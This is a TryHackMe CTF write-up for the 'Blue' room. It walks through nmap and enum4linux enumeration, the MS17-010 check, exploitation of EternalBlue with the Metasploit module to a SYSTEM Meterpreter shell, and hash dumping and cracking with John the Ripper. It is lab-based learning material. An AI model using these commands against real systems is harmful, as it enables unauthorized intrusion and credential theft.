# TryHackMe – Blue

**Completed:** *November 17th, 2025*  
**Platform:** TryHackMe  
> ⚠️ This write-up is for educational purposes only. All activity was conducted within legal lab environments.

This CTF focused on enumerating a Windows machine, identifying an SMB vulnerability, exploiting MS17-010 (EternalBlue), and performing post-exploitation actions including dumping and cracking password hashes to capture all flags.

---

## 🎯 Target: Windows Server

### 🔍 Nmap Scan

~~~bash
nmap -sS -sV -sC -T4 <IP>
~~~

**Explanation:** Performs a TCP SYN scan (`-sS`), service version detection (`-sV`), and runs default NSE scripts (`-sC`). The `-T4` flag speeds up scanning.

**Result:**
~~~
445/tcp open  microsoft-ds
~~~

---

## 📡 SMB Enumeration

~~~bash
enum4linux -A <IP>
~~~

**Explanation:** Enumerates SMB shares, users, OS information, and security policies.

Findings:
- SMBv1 enabled  
- Host information and shares discovered  
- SMB confirmed as valid attack surface

---

## 🧪 Vulnerability Scan (MS17-010)

~~~bash
nmap --script smb-vuln-ms17-010 -T4 <IP>
~~~

**Explanation:** Checks whether the host is vulnerable to MS17-010.

**Result:**  
Target confirmed **VULNERABLE** to EternalBlue.

---

## 💥 EternalBlue Exploitation

~~~bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
run
~~~

**Explanation:** SMBv1 contains a critical memory corruption flaw (MS17-010) in the way it handles specially crafted packets.  
This vulnerability allows remote code execution **without authentication**, making it possible to gain SYSTEM privileges on unpatched Windows machines.

The Metasploit module automates the exploit process by sending the required malformed SMB packets, triggering the overflow, and delivering a payload that opens a SYSTEM‑level Meterpreter session.

✅ **Result:** Meterpreter session opened as **NT AUTHORITY\SYSTEM**.

---

## 🖥️ Post-Exploitation Enumeration

Dumped password hashes:

~~~bash
hashdump
~~~

Saved hashes to a file:

~~~bash
echo "<hashes>" > hash.txt
~~~

---

## 🔐 Hash Cracking

~~~bash
john hash.txt --wordlist=rockyou.txt
~~~

**Explanation:** Cracks NTLM hashes using John the Ripper and a dictionary attack to recover plaintext passwords.

The goal was to access user accounts using the cracked credentials in order to retrieve a flag stored in their directories.

Checked **C:\Users**, **root directories**, and user profile locations to retrieve all available flags.

---

## 🧠 Summary

| Phase | Key Finding |
|-------|-------------|
| Initial Enumeration | SMBv1 running on port 445 |
| Vulnerability Scan | MS17-010 confirmed |
| Exploitation | EternalBlue → SYSTEM shell |
| Post-Exploitation | NTLM hashes dumped & cracked |
| Outcome | Full compromise + all flags captured |

---

## 💡 Lessons Learned

- SMBv1 is a high-risk protocol and should be disabled  
- EternalBlue demonstrates the impact of unpatched critical vulnerabilities  
- NTLM hash extraction and cracking are essential Windows post-exploitation workflow steps
